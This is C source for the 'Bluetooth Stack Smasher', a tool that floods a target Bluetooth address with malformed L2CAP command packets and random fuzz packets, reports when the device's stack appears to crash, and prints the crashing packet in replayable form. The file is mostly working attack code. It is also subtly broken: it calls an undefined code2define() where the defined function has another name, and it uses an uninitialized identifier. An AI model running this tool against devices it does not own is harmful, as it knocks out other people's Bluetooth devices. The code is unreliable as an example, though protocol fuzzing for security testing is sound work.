/*
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
char *code2define(int code);

/**
 * Function to perform L2CAP fuzz testing.
 *
 * This function establishes a raw L2CAP socket, binds, and connects to a specified Bluetooth device.
 * It then constructs a packet with specified size and padding, and sends it multiple times to the target.
 * The function also includes error handling and displays relevant information if a crash is suspected.
 *
 * @param bdstr_addr Address of the target Bluetooth device as a string.
 * @param cmdnum L2CAP command number to use for fuzzing.
 * @param siz Size of the packet to be sent.
 * @param pad Character to use for padding the packet; if 0, the padding byte will be 0x41.
 */
void l2dos(char *bdstr_addr, int cmdnum, int packet_size, char padding_char)
{
	char *buffer;
	l2cap_cmd_hdr *command_header;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
	struct sockaddr_l2 socket_address;
	int socket_descriptor, iteration, identifier;
	char *command_string = NULL;
	
	if ((socket_descriptor = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&socket_address, 0, sizeof(socket_address));
	socket_address.l2_family = AF_BLUETOOTH;
	if (bind(socket_descriptor, (struct sockaddr *) &socket_address, sizeof(socket_address)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &socket_address.l2_bdaddr);
	if (connect(socket_descriptor, (struct sockaddr *) &socket_address, sizeof(socket_address)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(buffer = (char *) malloc ((int) packet_size))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	for(iteration = L2CAP_CMD_HDR_SIZE; iteration < packet_size; iteration++)
	{
		if(padding_char == 0)
			buffer[iteration] = 0x41;		/* Default padding byte */
		else
			buffer[iteration] = padding_char;
	}
	
	fprintf(stdout, "size = %d\n", packet_size);
	command_string = code2define(cmdnum);
	if(command_string == NULL)
	{
		perror("L2CAP command unknown");
		exit(EXIT_FAILURE);
	}
	else
		fprintf(stdout, "Performing \"%s\" fuzzing...\n", command_string);

	for(iteration = 0; iteration < IT; iteration++){			// Send IT times the packet thru the air
		command_header = (l2cap_cmd_hdr *) buffer;
		command_header->code = cmdnum;
		command_header->ident = (iteration%250) + 1;		// Identifier 
		command_header->len = __cpu_to_le16(LENGTH);

		putchar('.');
		fflush(stdout);
		
		if(send(socket_descriptor, buffer, packet_size ? packet_size : MAXSIZE, 0) <= 0)
		{
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, command_string);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t ----------------------------------------------------\n");
			fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\t Code field\t%s\n", command_string);
			fprintf(stdout, "\t Ident field\t%d\n", identifier);
			fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
			fprintf(stdout, "\t Packet size\t%d\n", packet_size);
			fprintf(stdout, "\t ----------------------------------------------------\n");
		}
		if(++identifier > 254)
			identifier = 1;
	}

	free(command_string);	
}

/**
 * l2fuzz - Send random L2CAP packets to a Bluetooth device, potentially causing crashes.
 *
 * @bdstr_addr: Bluetooth device address to send packets to (as a string).
 * @maxsize: Maximum size of the random packets.
 * @maxcrash: Maximum number of crashes to allow before exiting.
 *
 * This function continuously sends random L2CAP packets of varying size (up to maxsize)
 * to the specified Bluetooth device. If the device crashes (evidenced by send() failing),
 * it prints information about the crash and the packet that caused it. The function exits
 * after maxcrash crashes have been detected or if maxcrash is set to 0, it runs indefinitely.
 *
 * It requires the Bluetooth device's address to be passed as a string in bdstr_addr.
 * The function binds a socket to the Bluetooth adapter, connects to the specified device,
 * then enters an infinite loop where it sends random data.
 */
void l2fuzz(char *device_address, int max_packet_size, int crash_limit)
{
	char *packet_buffer, *last_packet_buffer;
	struct sockaddr_l2 device_address_struct;
	int socket_fd, i, packet_size;
	int crash_count = 0, last_packet_size;

	if ((socket_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&device_address_struct, 0, sizeof(device_address_struct));
	device_address_struct.l2_family = AF_BLUETOOTH;
	if (bind(socket_fd, (struct sockaddr *) &device_address_struct, sizeof(device_address_struct)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(device_address, &device_address_struct.l2_bdaddr);
	if (connect(socket_fd, (struct sockaddr *) &device_address_struct, sizeof(device_address_struct)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if (!(last_packet_buffer = (char *) malloc ((int) max_packet_size + 1))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	while (1)
	{
		packet_size = rand() % max_packet_size;
		if (packet_size == 0) 
			packet_size = 1;
		if (!(packet_buffer = (char *) malloc ((int) packet_size + 1))) {
			perror("malloc");
			exit(EXIT_FAILURE);
		}

		bzero(packet_buffer, packet_size);
		for (i = 0; i < packet_size; i++)	
			packet_buffer[i] = (char) rand();
		
		putchar('.');
		fflush(stdout);

		if (send(socket_fd, packet_buffer, packet_size, 0) <= 0) {
			crash_count++;
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", device_address);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tHost\t\t%s\n", device_address);
			fprintf(stdout, "\tPacket size\t%d\n", last_packet_size);
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tPacket dump\n\t");
			for (i = 0; i < last_packet_size; i++) {
				fprintf(stdout, "0x%.2X ", (unsigned char) last_packet_buffer[i]);
				if ((i % 30) == 29)
					fprintf(stdout, "\n\t");
			}
			fprintf(stdout, "\n\t----------------------------------------------------\n");

			fprintf(stdout, "char replay_buggy_packet[]=\"");
			for (i = 0; i < last_packet_size; i++) {
				fprintf(stdout, "\\x%.2X", (unsigned char) last_packet_buffer[i]);
			}
			fprintf(stdout, "\";\n");

			if ((crash_count == crash_limit) && (crash_limit != 0) && (crash_limit >= 0)) {
				free(packet_buffer);
				free(last_packet_buffer);
				exit(EXIT_SUCCESS);
			}
		}
		memcpy(last_packet_buffer, packet_buffer, packet_size); // Get the previous packet, not this one...
		last_packet_size = packet_size;
		free(packet_buffer);
	}
}

/**
 * usage - Prints the usage information of the Bluetooth Stack Smasher (BSS) tool and exits the program.
 * @executableName: The name of the executable (typically argv[0]).
 *
 * This function prints out the usage information, including the different modes available for 
 * the tool, and how to use its arguments. After printing the information, the function exits 
 * the program with a failure status.
 */
int usage(char *executableName)
{
	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", executableName);
	fprintf(stderr, "Modes are :\n	\
			0  ALL MODES LISTED BELOW\n	\
			1  L2CAP_COMMAND_REJ\n	\
			2  L2CAP_CONN_REQ\n	\
			3  L2CAP_CONN_RSP\n	\
			4  L2CAP_CONF_REQ\n	\
			5  L2CAP_CONF_RSP\n	\
			6  L2CAP_DISCONN_REQ\n	\
			7  L2CAP_DISCONN_RSP\n	\
			8  L2CAP_ECHO_REQ\n	\
			9  L2CAP_ECHO_RSP\n	\
			10 L2CAP_INFO_REQ\n	\
			11 L2CAP_INFO_RSP\n	\
			12 L2CAP Random Fuzzing (-s : max_size) (-M crashcount)\n\n");	
	exit(EXIT_FAILURE);
}


/**
 * Converts a given L2CAP code to its corresponding string definition.
 *
 * This function takes an integer code representing an L2CAP message type 
 * and returns a dynamically allocated string describing the type. 
 * If the code is not recognized, it returns NULL.
 *
 * @param l2cap_code The L2CAP code to be converted to a string.
 * @return A pointer to a dynamically allocated string containing the 
 *         description of the L2CAP code, or NULL if the code is not recognized.
 */
char *convert_l2cap_code_to_string(int l2cap_code)
{
	char *l2cap_code_string = malloc(BUFCODE + 1);
	switch(l2cap_code)
	{
		case L2CAP_ECHO_REQ:
			strcpy(l2cap_code_string, "L2CAP echo request");	
			break;

		case L2CAP_COMMAND_REJ:
			strcpy(l2cap_code_string, "L2CAP command reject");	
			break;
			
		case L2CAP_CONN_REQ:
			strcpy(l2cap_code_string, "L2CAP connection request");	
			break;
			
		case L2CAP_CONN_RSP:
			strcpy(l2cap_code_string, "L2CAP connection response");	
			break;
			
		case L2CAP_CONF_REQ:
			strcpy(l2cap_code_string, "L2CAP configuration request");	
			break;
			
		case L2CAP_CONF_RSP:
			strcpy(l2cap_code_string, "L2CAP configuration response");	
			break;
			
		case L2CAP_DISCONN_REQ:
			strcpy(l2cap_code_string, "L2CAP disconnection request");	
			break;
			
		case L2CAP_DISCONN_RSP:
			strcpy(l2cap_code_string, "L2CAP disconnection response");	
			break;
			
		case L2CAP_ECHO_RSP:
			strcpy(l2cap_code_string, "L2CAP echo response");	
			break;
			
		case L2CAP_INFO_REQ:
			strcpy(l2cap_code_string, "L2CAP info request");	
			break;
			
		case L2CAP_INFO_RSP:
			strcpy(l2cap_code_string, "L2CAP info response");	
			break;
			
		default:
			free(l2cap_code_string);
            l2cap_code_string = NULL;
	}
	return l2cap_code_string;
}

/**
 * @brief Main function to run the Bluetooth device test tool.
 *
 * This function initializes variables, checks for root privileges, parses command-line arguments,
 * and calls specific testing functions based on the parsed mode. It targets a Bluetooth device
 * for various testing operations, potentially causing it to crash with malformed packets.
 *
 * @param argc Number of arguments passed to the program.
 * @param argv Array of argument strings.
 *
 * @return EXIT_SUCCESS on successful execution, otherwise exits with a failure status.
 */
int main(int argc, char **argv)
{
	int arg_index, size = 0, test_mode = 0, max_crashes = 1;
	char bluetooth_address[20], padding = 0;

	if(getuid() != 0)
	{
		fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if(argc < 2 || argc > 9)
	{
		usage(argv[0]);
	}
	
	for(arg_index = 0; arg_index < argc; arg_index++){
		if(strchr(argv[arg_index], ':'))
			strncpy(bluetooth_address, argv[arg_index], 18);
		else
		{
			if(!memcmp(argv[arg_index], "-s", 2) && (size = atoi(argv[++arg_index])) < 0)
				usage(argv[0]);
		
			if(!memcmp(argv[arg_index], "-m", 2) && (test_mode = atoi(argv[++arg_index])) < 0)
				usage(argv[0]);
		
			if(!memcmp(argv[arg_index], "-p", 2) && (padding = (*argv[++arg_index])) < 0)
				usage(argv[0]);
		
			if(!memcmp(argv[arg_index], "-M", 2) && (max_crashes = atoi(argv[++arg_index])) < 0)
				usage(argv[0]);
		}
	}

	if(test_mode > 12)
	{
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	if(test_mode == 0)
	{
		for(arg_index = 1; arg_index <= 0x0b; arg_index++)
			l2dos(bluetooth_address, arg_index, size ? size : MAXSIZE, padding);
		l2fuzz(bluetooth_address, size ? size : MAXSIZE, max_crashes);
	}
	else
	{
		if(test_mode <= 11)
			l2dos(bluetooth_address, test_mode, size ? size : MAXSIZE, padding);
		if(test_mode == 12)
			l2fuzz(bluetooth_address, size ? size : MAXSIZE, max_crashes);
	}
	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
	
	return EXIT_SUCCESS;
}
